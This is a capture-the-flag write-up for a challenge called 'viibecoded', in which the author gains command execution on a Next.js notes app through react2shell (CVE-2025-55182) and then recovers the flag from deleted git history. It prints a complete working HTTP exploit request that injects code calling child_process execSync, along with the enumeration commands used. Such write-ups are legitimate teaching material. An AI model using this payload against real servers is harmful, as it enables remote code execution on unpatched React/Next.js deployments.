#### viibecoded
- points earned: 372
#### Investigating the app
- No source code was provided with this challenge, so I'll need to do some black-box testing on this one.
- From a UI/UX perspective I see, on the main app page, that there's a place to sign in  and a place to register.
- After registering I see a form to type up a note.  When submitting the form, the note gets posted below.
- Looking at the requests getting sent to this app I quickly realized that this was a next app.
- At this point I tested a couple of react2shell payloads without any luck at all.
- I continued testing the app functionality but didn't find anything special.
- I decided to start looking through the client-side source for anything out of the ordinary, perhaps an unknown app route.
- I can across the line `n.version = "19.2.0-canary-197d6a04-20250424"` which made me go back and recheck for react2shell vulnerabilities.
	- The reason this prompted me to go back to react2shell is because `19.2.0` looks like a version of react that is vulnerable to react2shell based on reports to CVE-2025-55182.
- After some playing around and verifying of sources (https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3) it turns out that the original react2shell payloads that I was using was slightly incorrect.
- With standard enumeration on a command execution I was able to find  a `/flag.txt` on the filesystem.
	- However, this file contained `tjctf{lmao_lock_in_stop_finding_f4k3s}` which I blindly copied into the CTF platform and then got rejected.
	- Lol, `stop_finding_f4k3s`.  It's not the flag.

#### Investigation into the filesystem via command execution
- I did a bunch of standard enumeration here like printing out server source code (`server.js`) and printing the contents of the current directory and others.
- One interesting thing that I found was the `.git` dir in the web app's project dir.
- Reading `.git/COMMIT_EDITMSG` I get the curious message 'remove sensitive config'.
- Luckily the target challenge has `git` installed which makes parsing through commit history easy.
- `git log` results in
```bash
commit 8e522db0209846f1941e9d675bdc12c9d36272d1
Author: yap-dev <dev@yapapp.com>
Date:   Fri May 15 10:57:21 2026 +0000

    remove sensitive config

commit 0692a5a01fa58dfd28e1e449a3e876c2f62162b0
Author: yap-dev <dev@yapapp.com>
Date:   Fri May 15 10:57:20 2026 +0000

    initial commit
```
- and then `git show 8e522db0209846f1941e9d675bdc12c9d36272d1` results in
```bash
commit 8e522db0209846f1941e9d675bdc12c9d36272d1
Author: yap-dev <dev@yapapp.com>
Date:   Fri May 15 10:57:21 2026 +0000

    remove sensitive config

diff --git a/.env b/.env
deleted file mode 100644
index 958d9d6..0000000
--- a/.env
+++ /dev/null
@@ -1 +0,0 @@
-FLAG=tjctf{th1s_1s_Y_w3_d0nt_vibeeee_codeeee_sv3lte_ov3r_r34ct_any_d4y_r34ct_s3rv3r_c0mp0n3nts_CVE-2025-55182}
```
- And we have the real flag. Nice!

#### Solution
- The basic Idea of this challenge was to exploit react2shell(CVE-2025-55182) to enumerate the target filesystem and discover the flag.
- The general payload that I was using is below.  Substituting `cat /flag.txt` for the different shell commands.
```http
POST / HTTP/1.1
Host: vibecoded-0381c9aa48a2bb2e.tjc.tf
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: 459

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('cat /flag.txt',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```
- The commands that led to the flag:
	- `ls` led to the discovery of the `.git` dir
	- `git log` led to discovery of curious commit
	- `git show 8e522db0209846f1941e9d675bdc12c9d36272d1` printed the diff for that commit which contained the flag.
